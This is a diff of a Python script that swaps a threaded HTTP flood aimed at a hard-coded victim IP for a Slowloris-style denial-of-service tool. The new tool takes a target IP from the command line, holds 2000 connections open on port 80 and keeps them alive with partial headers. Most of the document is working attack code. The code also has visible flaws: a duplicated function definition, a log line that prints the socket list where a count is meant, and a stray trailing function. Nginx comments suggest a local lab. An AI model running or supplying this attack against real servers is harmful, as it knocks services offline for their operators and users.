@@ -2,57 +2,91 @@
 ####################################################     LIBRARIES     ####################################################
 ###########################################################################################################################
 
+import sys
+import time
 import socket
-import threading
+import random
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
 
-# Gets the host IP address
-ATTACKER_IP = socket.gethostbyname(socket.gethostname())
-VICTIM_IP = '10.0.2.15'
-PORT = 8000
-NUMBER_OF_THREADS = 10
+log_level = 2
 
-class MyThread(threading.Thread):
-    def __init__(self):
-        super(MyThread, self).__init__()
-        self._stop_event = threading.Event()
+def log(text, level=1):
+    if log_level >= level:
+        print(text)
 
-    def run(self):
-        while not self._stop_event.is_set(): attack()
+list_of_sockets = []
 
-    def stop(self): self._stop_event.set()
+regular_headers = [
+    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/1234567",
+    "Accept-language: en-US,en,q=0.5"
+]
 
-def attack():
-    # AF_INET: Specifies the address family (IPv4)
-    # SOCK_STREAM: specifies the socket type (TCP)
-    ddos_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ddos_socket.connect((VICTIM_IP, PORT))
-    ddos_socket.sendto((f"GET /{VICTIM_IP} HTTP/1.1\r\n").encode('ascii'), (VICTIM_IP, PORT))
-    ddos_socket.sendto((f"Host: {ATTACKER_IP}\r\n\r\n").encode('ascii'), (VICTIM_IP, PORT))
-    ddos_socket.close()
+def init_socket(ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((ip, 80))
+
+    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 4000)).encode("utf-8"))
+
+    for header in regular_headers:
+        sock.send("{}\r\n".format(header).encode('utf-8'))
+
+    return sock
+
+def init_socket(ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((ip, 80))
+
+    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 4000)).encode("utf-8"))
+
+    for header in regular_headers:
+        sock.send("{}\r\n".format(header).encode('utf-8'))
+
+    return sock
 
 ###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
 ###########################################################################################################################
 
+def main():
+    ip = sys.argv[1]
+    socket_count = 2000
+    log("Attacking {} with {} sockets".format(ip, socket_count))
+
+    log("Creating sockets...")
+    for i in range(socket_count):
+        try:
+            log("Creating socket nr {}".format(i))
+            s = init_socket(ip)
+        except socket.error:
+            break
+        list_of_sockets.append(s)
+
+    while True:
+        log("Sending keep-alive headers...Socket count: {}".format(list_of_sockets))
+        for s in list(list_of_sockets):
+            try:
+                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8'))
+            except socket.error:
+                list_of_sockets.remove(s)
+
+        for _ in range(socket_count - len(list_of_sockets)):
+            log("Recreating socket...")
+            try:
+                s = init_socket(ip)
+                if s:
+                    list_of_sockets.append(s)
+            except socket.error:
+                break
+        time.sleep(5)
+
+# Install the server: sudo apt install nginx
+# Start the server (localhost:80): sudo systemctl start nginx.service
+# Check the status of the server: systemctl status nginx.service
+
 if __name__ == '__main__':
-    from time import sleep
+    main()
 
-    print(f'Starting {NUMBER_OF_THREADS} DDoS threads...')
-    threads = []
-    for index in range(NUMBER_OF_THREADS):
-        thread = MyThread()
-        thread.start()
-        threads.append(thread)
-
-    print(f'Attack started! Waiting 10 seconds...')
-    sleep(10)
-
-    for thread in threads: 
-        thread.stop()
-        thread.join()
-
-    print(f'Attack finished!')
+def run(): return
